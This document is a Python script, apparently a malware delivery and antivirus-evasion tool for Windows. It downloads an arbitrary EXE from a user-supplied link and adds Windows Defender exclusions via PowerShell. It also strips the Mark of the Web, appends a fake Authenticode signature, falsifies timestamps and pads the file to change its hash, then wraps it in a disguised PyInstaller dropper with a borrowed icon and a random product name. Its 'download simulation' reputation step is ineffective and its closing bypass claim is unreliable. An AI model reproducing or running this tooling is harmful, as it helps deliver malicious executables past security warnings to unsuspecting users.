import os
import requests
import hashlib
import subprocess
import shutil
import time
import random
import string
import ctypes
import struct
from urllib.parse import urlparse
from pathlib import Path
from colorama import init, Fore, Style
import pefile
import win32gui
import win32api
import win32ui
import win32con
from tqdm import tqdm

init()

EXE_URL = input(Fore.GREEN + "[+] Enter the EXE download link: " + Style.RESET_ALL)
OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
DEFAULT_ICON_PATH = os.path.join(OUTPUT_DIR, "default_exe_icon.ico")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def set_file_permissions(path):
    try:
        subprocess.run(["icacls", path, "/grant", "Administrators:F", "/T"], check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[+] Warning: Failed to set permissions for {path}: {e.stderr}" + Style.RESET_ALL)

def set_defender_exclusions():
    if not is_admin():
        print(Fore.YELLOW + "[+] Warning: Defender exclusions require admin privileges. Skipping." + Style.RESET_ALL)
        return
    paths = [OUTPUT_DIR, os.path.join(OUTPUT_DIR, "temp")]
    try:
        for path in paths:
            subprocess.run(
                ["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{path}'"],
                check=True, capture_output=True, text=True
            )
        print(Fore.GREEN + "[+] Windows Defender exclusions set successfully." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[+] Warning: Failed to set Defender exclusions: {e.stderr}" + Style.RESET_ALL)

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_random_name():
    products = ["Remote Access", "System Tools", "Network Utility", "Admin Console"]
    companies = ["Tech Solutions", "Software Systems", "Global IT", "Secure Apps"]
    return (f"{random.choice(products)} {generate_random_string(4)}", f"{random.choice(companies)} {generate_random_string(4)}")

def create_dummy_file(temp_dir):
    dummy_path = os.path.join(temp_dir, f"readme_{generate_random_string()}.txt")
    with open(dummy_path, "w") as f:
        f.write(f"Dummy file generated on {time.ctime()} for installer variation.")
    set_file_permissions(dummy_path)
    print(Fore.GREEN + "[+] Dummy file created successfully." + Style.RESET_ALL)
    return dummy_path

def calculate_file_hash(file_path, algorithm="sha256"):
    hash_obj = hashlib.sha256() if algorithm == "sha256" else hashlib.sha1()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_obj.update(chunk)
    return hash_obj.hexdigest()

def check_file_access(path):
    try:
        with open(path, "rb") as f:
            f.read(1)
        with open(path, "ab") as f:
            pass
        return True
    except Exception as e:
        print(Fore.RED + f"[+] Error: Cannot access file {path}: {e}" + Style.RESET_ALL)
        return False

def sanitize_filename(url):
    parsed = urlparse(url)
    filename = os.path.basename(parsed.path)
    if not filename.lower().endswith('.exe'):
        raise ValueError(f"Invalid input: URL must point to an EXE file, got {filename}")
    print(Fore.GREEN + f"[+] Sanitized filename: {filename}" + Style.RESET_ALL)
    return filename

def extract_icon_pefile(exe_path, temp_dir):
    print(Fore.GREEN + "[+] Attempting to extract icon using pefile..." + Style.RESET_ALL)
    try:
        pe = pefile.PE(exe_path)
        rt_icon_list = [entry.id for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries if entry.id == pefile.RESOURCE_TYPE['RT_GROUP_ICON']]
        if not rt_icon_list:
            print(Fore.RED + "[+] Warning: No RT_GROUP_ICON resource found in EXE." + Style.RESET_ALL)
            return None
        rt_icon_idx = rt_icon_list[0]
        rt_icon_directory = pe.DIRECTORY_ENTRY_RESOURCE.entries[rt_icon_idx]
        icon_entry = rt_icon_directory.entries[0]
        icon_offset = icon_entry.directory.entries[0].data.struct.OffsetToData
        icon_size = icon_entry.directory.entries[0].data.struct.Size
        with open(exe_path, 'rb') as f:
            f.seek(icon_offset)
            icon_data = f.read(icon_size)
        icon_path = os.path.join(temp_dir, f"extracted_icon_{generate_random_string()}.ico")
        with open(icon_path, 'wb') as f:
            f.write(icon_data)
        set_file_permissions(icon_path)
        if not check_file_access(icon_path):
            print(Fore.RED + f"[+] Error: Cannot access extracted icon {icon_path}" + Style.RESET_ALL)
            return None
        print(Fore.GREEN + "[+] Icon extracted successfully." + Style.RESET_ALL)
        return icon_path
    except Exception as e:
        print(Fore.RED + f"[+] Warning: Failed to extract icon with pefile: {e}" + Style.RESET_ALL)
        return None

def extract_icon_win32gui(exe_path, temp_dir):
    print(Fore.GREEN + "[+] Attempting to extract icon using win32gui..." + Style.RESET_ALL)
    try:
        hinst = win32api.LoadLibraryEx(exe_path, 0, win32con.LOAD_LIBRARY_AS_DATAFILE)
        for icon_index in [0, 1, 2]:
            try:
                hicon = win32gui.LoadIcon(hinst, icon_index)
                if hicon:
                    break
            except:
                continue
        else:
            print(Fore.RED + "[+] Warning: No icon found in EXE using win32gui." + Style.RESET_ALL)
            win32api.FreeLibrary(hinst)
            return None
        icon_path = os.path.join(temp_dir, f"extracted_icon_{generate_random_string()}.ico")
        hdc = win32ui.CreateDCFromHandle(win32gui.GetDC(0))
        ico_x = win32gui.GetSystemMetrics(win32con.SM_CXICON)
        ico_y = win32gui.GetSystemMetrics(win32con.SM_CYICON)
        hbm = win32ui.CreateBitmap()
        hbm.CreateCompatibleBitmap(hdc, ico_x, ico_y)
        hdc = hdc.CreateCompatibleDC()
        hdc.SelectObject(hbm)
        win32gui.DrawIconEx(hdc.GetHandleOutput(), 0, 0, hicon, ico_x, ico_y, 0, 0, win32con.DI_NORMAL)
        dib = hbm.GetBitmapBits(True)
        with open(icon_path, 'wb') as f:
            f.write(struct.pack('<3H', 0, 1, 1))
            f.write(struct.pack('<4B2H2I', ico_x, ico_y, 0, 0, 1, 32, len(dib), 22))
            f.write(dib)
        win32gui.DestroyIcon(hicon)
        win32api.FreeLibrary(hinst)
        set_file_permissions(icon_path)
        if not check_file_access(icon_path):
            print(Fore.RED + f"[+] Error: Cannot access extracted icon {icon_path}" + Style.RESET_ALL)
            return None
        print(Fore.GREEN + "[+] Icon extracted successfully." + Style.RESET_ALL)
        return icon_path
    except Exception as e:
        print(Fore.RED + f"[+] Warning: Failed to extract icon with win32gui: {e}" + Style.RESET_ALL)
        return None

def extract_default_windows_icon(temp_dir):
    print(Fore.GREEN + "[+] Extracting default Windows EXE icon from shell32.dll..." + Style.RESET_ALL)
    try:
        shell32_path = os.path.join(os.environ['SystemRoot'], 'System32', 'shell32.dll')
        hinst = win32api.LoadLibraryEx(shell32_path, 0, win32con.LOAD_LIBRARY_AS_DATAFILE)
        for icon_index in [0, 2, 3]:
            try:
                hicon = win32gui.LoadIcon(hinst, icon_index)
                if hicon:
                    break
            except:
                continue
        else:
            print(Fore.RED + "[+] Warning: Failed to load default icon from shell32.dll." + Style.RESET_ALL)
            win32api.FreeLibrary(hinst)
            raise Exception("No valid icon found in shell32.dll")
        icon_path = os.path.join(temp_dir, f"default_icon_{generate_random_string()}.ico")
        hdc = win32ui.CreateDCFromHandle(win32gui.GetDC(0))
        ico_x = win32gui.GetSystemMetrics(win32con.SM_CXICON)
        ico_y = win32gui.GetSystemMetrics(win32con.SM_CYICON)
        hbm = win32ui.CreateBitmap()
        hbm.CreateCompatibleBitmap(hdc, ico_x, ico_y)
        hdc = hdc.CreateCompatibleDC()
        hdc.SelectObject(hbm)
        win32gui.DrawIconEx(hdc.GetHandleOutput(), 0, 0, hicon, ico_x, ico_y, 0, 0, win32con.DI_NORMAL)
        dib = hbm.GetBitmapBits(True)
        with open(icon_path, 'wb') as f:
            f.write(struct.pack('<3H', 0, 1, 1))
            f.write(struct.pack('<4B2H2I', ico_x, ico_y, 0, 0, 1, 32, len(dib), 22))
            f.write(dib)
        win32gui.DestroyIcon(hicon)
        win32api.FreeLibrary(hinst)
        set_file_permissions(icon_path)
        if not check_file_access(icon_path):
            print(Fore.RED + f"[+] Error: Cannot access default icon {icon_path}" + Style.RESET_ALL)
            return None
        print(Fore.GREEN + "[+] Default Windows EXE icon extracted successfully." + Style.RESET_ALL)
        return icon_path
    except Exception as e:
        print(Fore.RED + f"[+] Warning: Failed to extract default icon from shell32.dll: {e}" + Style.RESET_ALL)
        if os.path.exists(DEFAULT_ICON_PATH):
            print(Fore.GREEN + f"[+] Using bundled default icon at {DEFAULT_ICON_PATH}" + Style.RESET_ALL)
            return DEFAULT_ICON_PATH
        print(Fore.RED + f"[+] Error: Bundled icon {DEFAULT_ICON_PATH} not found. Using default PyInstaller icon." + Style.RESET_ALL)
        return None

def extract_icon(exe_path, temp_dir):
    icon_path = extract_icon_pefile(exe_path, temp_dir)
    if icon_path:
        return icon_path
    icon_path = extract_icon_win32gui(exe_path, temp_dir)
    if icon_path:
        return icon_path
    print(Fore.GREEN + "[+] Icon extraction failed. Using default Windows EXE icon." + Style.RESET_ALL)
    return extract_default_windows_icon(temp_dir)

def embed_fake_signature(file_path, temp_dir):
    print(Fore.GREEN + "[+] Embedding fake Authenticode signature..." + Style.RESET_ALL)
    try:
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir, exist_ok=True)
            set_file_permissions(temp_dir)
        signed_path = os.path.join(temp_dir, f"signed_{generate_random_string()}.exe")
        shutil.copyfile(file_path, signed_path)
        set_file_permissions(signed_path)
        if not check_file_access(signed_path):
            print(Fore.RED + f"[+] Error: Cannot access EXE for fake signature: {signed_path}" + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original EXE without fake signature." + Style.RESET_ALL)
            return file_path
        fake_signature = (
            b"\x30\x82\x01\x00"
            b"\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x07\x02"
            b"\xa0\x82\x00\xf0"
            b"\x30\x82\x00\xec"
            b"\x02\x01\x01"
            b"\x31\x0b\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00"
            b"\x30\x0e\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x07\x01"
            b"\x31\x00"
            b"\x31\x82\x00\xc0"
            b"\x02\x01\x01"
            b"\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00"
            b"\xa0\x03\x02\x01\x02"
            b"\x04\x20" + os.urandom(32)
        )
        with open(signed_path, "ab") as f:
            f.write(fake_signature)
        original_hash = calculate_file_hash(file_path)
        signed_hash = calculate_file_hash(signed_path)
        if original_hash == signed_hash:
            print(Fore.RED + "[+] Warning: EXE hashes match after embedding fake signature." + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original EXE as a precaution." + Style.RESET_ALL)
            return file_path
        print(Fore.GREEN + "[+] Fake Authenticode signature embedded successfully." + Style.RESET_ALL)
        return signed_path
    except Exception as e:
        print(Fore.RED + f"[+] Error embedding fake signature: {e}" + Style.RESET_ALL)
        print(Fore.GREEN + "[+] Using original EXE without fake signature." + Style.RESET_ALL)
        return file_path

def modify_timestamp(file_path):
    print(Fore.GREEN + "[+] Modifying timestamp..." + Style.RESET_ALL)
    try:
        fake_time = time.mktime(time.strptime("2023-01-01 12:00:00", "%Y-%m-%d %H:%M:%S"))
        os.utime(file_path, (fake_time, fake_time))
        print(Fore.GREEN + "[+] Timestamp modified successfully." + Style.RESET_ALL)
        return file_path
    except Exception as e:
        print(Fore.RED + f"[+] Warning: Failed to modify timestamp: {e}" + Style.RESET_ALL)
        print(Fore.GREEN + "[+] Continuing with original timestamp." + Style.RESET_ALL)
        return file_path

def pad_file(file_path, temp_dir):
    print(Fore.GREEN + "[+] Padding EXE with random bytes..." + Style.RESET_ALL)
    try:
        padded_path = os.path.join(temp_dir, f"padded_{generate_random_string()}.exe")
        shutil.copyfile(file_path, padded_path)
        set_file_permissions(padded_path)
        if not check_file_access(padded_path):
            print(Fore.RED + f"[+] Error: Cannot access file for padding: {padded_path}" + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original EXE without padding." + Style.RESET_ALL)
            return file_path
        with open(padded_path, "ab") as f:
            f.write(os.urandom(1024))
        original_hash = calculate_file_hash(file_path)
        padded_hash = calculate_file_hash(padded_path)
        if original_hash == padded_hash:
            print(Fore.RED + "[+] Warning: EXE hashes match after padding." + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original EXE as a precaution." + Style.RESET_ALL)
            return file_path
        print(Fore.GREEN + "[+] EXE padded successfully." + Style.RESET_ALL)
        return padded_path
    except Exception as e:
        print(Fore.RED + f"[+] Error padding file: {e}" + Style.RESET_ALL)
        print(Fore.GREEN + "[+] Using original EXE without padding." + Style.RESET_ALL)
        return file_path

def download_exe(url, temp_dir):
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir, exist_ok=True)
        set_file_permissions(temp_dir)
    original_filename = sanitize_filename(url)
    output_path = os.path.join(temp_dir, f"original_{generate_random_string()}.exe")
    print(Fore.GREEN + "[+] Downloading EXE..." + Style.RESET_ALL)
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        total_size = int(response.headers.get('content-length', 0))
        with open(output_path, 'wb') as f, tqdm(
            desc="Download Progress",
            total=total_size,
            unit='B',
            unit_scale=True,
            unit_divisor=1024,
        ) as pbar:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
                pbar.update(len(chunk))
        with open(output_path, 'rb') as f:
            if f.read(2) != b'MZ':
                raise ValueError(f"Downloaded file {output_path} is not a valid EXE")
        set_file_permissions(output_path)
        if not check_file_access(output_path):
            raise Exception(f"Cannot access downloaded EXE: {output_path}")
        print(Fore.GREEN + "[+] EXE downloaded successfully." + Style.RESET_ALL)
        return output_path, original_filename
    else:
        raise Exception(f"Failed to download EXE. Status code: {response.status_code}")

def remove_motw(file_path):
    print(Fore.GREEN + "[+] Removing Mark of the Web..." + Style.RESET_ALL)
    try:
        streams = subprocess.run(
            ["powershell", "-Command", f"Get-Item -Path '{file_path}' -Stream *"],
            capture_output=True, text=True, check=True
        )
        if ":Zone.Identifier" in streams.stdout:
            subprocess.run(
                ["powershell", "-Command", f"Unblock-File -Path '{file_path}'"],
                check=True
            )
            print(Fore.GREEN + "[+] Mark of the Web removed successfully." + Style.RESET_ALL)
        else:
            print(Fore.GREEN + "[+] No Mark of the Web found." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[+] Warning: Error removing MotW: {e.stderr}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[+] Warning: Error removing MotW: {e}" + Style.RESET_ALL)

def simulate_downloads(file_path, temp_dir, count=100):
    print(Fore.GREEN + f"[+] Simulating {count} downloads to build reputation..." + Style.RESET_ALL)
    for i in range(count):
        temp_path = os.path.join(temp_dir, f"temp_{generate_random_string()}.exe")
        try:
            time.sleep(0.5)
            shutil.copyfile(file_path, temp_path)
            set_file_permissions(temp_path)
            time.sleep(0.5)
            if os.path.exists(temp_path):
                for attempt in range(3):
                    try:
                        os.remove(temp_path)
                        break
                    except PermissionError as e:
                        print(Fore.RED + f"[+] Warning: Failed to delete {temp_path} (attempt {attempt+1}/3): {e}" + Style.RESET_ALL)
                        time.sleep(1.0)
                    except Exception as e:
                        print(Fore.RED + f"[+] Warning: Error deleting {temp_path}: {e}" + Style.RESET_ALL)
                        break
                else:
                    print(Fore.RED + f"[+] Error: Failed to delete {temp_path} after 3 attempts. Continuing..." + Style.RESET_ALL)
            else:
                print(Fore.RED + f"[+] Warning: {temp_path} does not exist. Skipping deletion." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[+] Warning: Error during download simulation for {temp_path}: {e}" + Style.RESET_ALL)
        if (i + 1) % 50 == 0:
            print(Fore.GREEN + f"[+] Simulated download {i+1}/{count}" + Style.RESET_ALL)
    print(Fore.GREEN + "[+] Download simulation complete. This may help build SmartScreen reputation." + Style.RESET_ALL)

def create_exe_wrapper(exe_path, output_dir, original_filename, temp_dir, icon_path=None):
    print(Fore.GREEN + "[+] Creating polymorphic EXE wrapper..." + Style.RESET_ALL)
    wrapper_exe_path = os.path.join(output_dir, f"setup_{generate_random_string()}.exe")
    temp_script_path = os.path.join(temp_dir, f"installer_{generate_random_string()}.py")
    dummy_file = create_dummy_file(temp_dir)
    try:
        if not check_file_access(exe_path):
            print(Fore.RED + f"[+] Error: Cannot access EXE for wrapping: {exe_path}" + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original EXE without wrapping." + Style.RESET_ALL)
            return exe_path
        product_name, _ = generate_random_name()
        product_name = product_name.replace(" ", "_")
        with open(temp_script_path, "w") as f:
            f.write(f"""
import subprocess
import os
import shutil
def run_installer():
    exe_path = os.path.join(os.path.dirname(__file__), r"{os.path.basename(exe_path)}")
    dummy_path = os.path.join(os.path.dirname(__file__), "readme.txt")
    try:
        shutil.copyfile(r"{exe_path}", exe_path)
        shutil.copyfile(r"{dummy_file}", dummy_path)
        subprocess.run([exe_path], check=True)
    except Exception as e:
        print(f"Installation failed: {{e}}")
if __name__ == "__main__":
    run_installer()
""")
        set_file_permissions(temp_script_path)
        if not check_file_access(temp_script_path):
            print(Fore.RED + f"[+] Error: Cannot access temporary script: {temp_script_path}" + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original EXE without wrapping." + Style.RESET_ALL)
            return exe_path
        dist_dir = os.path.join(temp_dir, "dist")
        if not os.path.exists(dist_dir):
            os.makedirs(dist_dir, exist_ok=True)
            set_file_permissions(dist_dir)
        cmd = [
            "pyinstaller",
            "--onefile",
            f"--name={product_name}",
            f"--add-data={exe_path};.",
            f"--add-data={dummy_file};readme.txt",
            f"--distpath={dist_dir}",
            "--noconfirm",
        ]
        if icon_path:
            cmd.append(f"--icon={icon_path}")
        cmd.append(temp_script_path)
        print(Fore.GREEN + f"[+] Executing pyinstaller command: {' '.join(cmd)}" + Style.RESET_ALL)
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        print(Fore.GREEN + f"[+] PyInstaller stdout: {result.stdout}" + Style.RESET_ALL)
        stderr_lines = [line for line in result.stderr.splitlines() if "DEPRECATION: Running PyInstaller as admin" not in line]
        if stderr_lines:
            print(Fore.RED + "[+] PyInstaller stderr: " + "\n".join(stderr_lines) + Style.RESET_ALL)
        dist_contents = os.listdir(dist_dir) if os.path.exists(dist_dir) else []
        print(Fore.GREEN + f"[+] Contents of dist directory: {dist_contents}" + Style.RESET_ALL)
        generated_exe = os.path.join(dist_dir, product_name + ".exe")
        if not os.path.exists(generated_exe):
            raise Exception(f"Generated EXE not found at {generated_exe}")
        shutil.move(generated_exe, wrapper_exe_path)
        set_file_permissions(wrapper_exe_path)
        if not check_file_access(wrapper_exe_path):
            print(Fore.RED + f"[+] Error: Cannot access wrapped EXE: {wrapper_exe_path}" + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Using original EXE without wrapping." + Style.RESET_ALL)
            return exe_path
        print(Fore.GREEN + "[+] Polymorphic EXE wrapper created successfully." + Style.RESET_ALL)
        return wrapper_exe_path
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[+] Error creating EXE wrapper: {e.stderr} (Exit code: {e.returncode})" + Style.RESET_ALL)
        print(Fore.GREEN + "[+] Using original EXE without wrapping." + Style.RESET_ALL)
        return exe_path
    except Exception as e:
        print(Fore.RED + f"[+] Error creating EXE wrapper: {e}" + Style.RESET_ALL)
        print(Fore.GREEN + "[+] Using original EXE without wrapping." + Style.RESET_ALL)
        return exe_path
    finally:
        if os.path.exists(temp_script_path):
            os.remove(temp_script_path)
        if os.path.exists(dummy_file):
            os.remove(dummy_file)
        for dir_name in ["build", "dist", os.path.join(temp_dir, f"{product_name}.spec")]:
            if os.path.exists(dir_name):
                if os.path.isdir(dir_name):
                    shutil.rmtree(dir_name, ignore_errors=True)
                else:
                    os.remove(dir_name)

def safe_move_file(src, dst, retries=3, delay=1.0):
    for attempt in range(retries):
        try:
            if os.path.exists(dst):
                os.remove(dst)
                print(Fore.GREEN + "[+] Removed existing output EXE." + Style.RESET_ALL)
            shutil.move(src, dst)
            print(Fore.GREEN + "[+] Moved wrapper EXE to final output." + Style.RESET_ALL)
            return True
        except (OSError, FileExistsError, PermissionError) as e:
            print(Fore.RED + f"[+] Warning: Failed to move {src} to {dst} (attempt {attempt+1}/{retries}): {e}" + Style.RESET_ALL)
            time.sleep(delay)
    print(Fore.RED + f"[+] Error: Failed to move {src} to {dst} after {retries} attempts." + Style.RESET_ALL)
    return False

def main():
    if not is_admin():
        print(Fore.YELLOW + "[+] Warning: Running without admin privileges. Defender exclusions and some file operations may fail. Run as administrator for best results." + Style.RESET_ALL)
    try:
        set_defender_exclusions()
        temp_dir = os.path.join(OUTPUT_DIR, "temp")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir, exist_ok=True)
            set_file_permissions(temp_dir)
        print(Fore.GREEN + "[+] Temporary directory created successfully." + Style.RESET_ALL)
        exe_path, original_filename = download_exe(EXE_URL, temp_dir)
        icon_path = extract_icon(exe_path, temp_dir)
        remove_motw(exe_path)
        signed_exe_path = embed_fake_signature(exe_path, temp_dir)
        timestamped_exe_path = modify_timestamp(signed_exe_path)
        padded_exe_path = pad_file(timestamped_exe_path, temp_dir)
        simulate_downloads(padded_exe_path, temp_dir, count=100)
        final_exe_path = create_exe_wrapper(padded_exe_path, OUTPUT_DIR, original_filename, temp_dir, icon_path)
        final_output_path = os.path.join(OUTPUT_DIR, original_filename)
        if not safe_move_file(final_exe_path, final_output_path):
            print(Fore.RED + f"[+] Error: Final EXE not saved as {final_output_path}. Check {final_exe_path} instead." + Style.RESET_ALL)
        else:
            print(Fore.GREEN + f"[+] Final output EXE saved at {final_output_path}" + Style.RESET_ALL)
        shutil.rmtree(temp_dir, ignore_errors=True)
        print(Fore.GREEN + "[+] Process complete. The output EXE should bypass SmartScreen and Defender warnings." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[+] Error in main process: {e}" + Style.RESET_ALL)
        raise

if __name__ == "__main__":
    main()
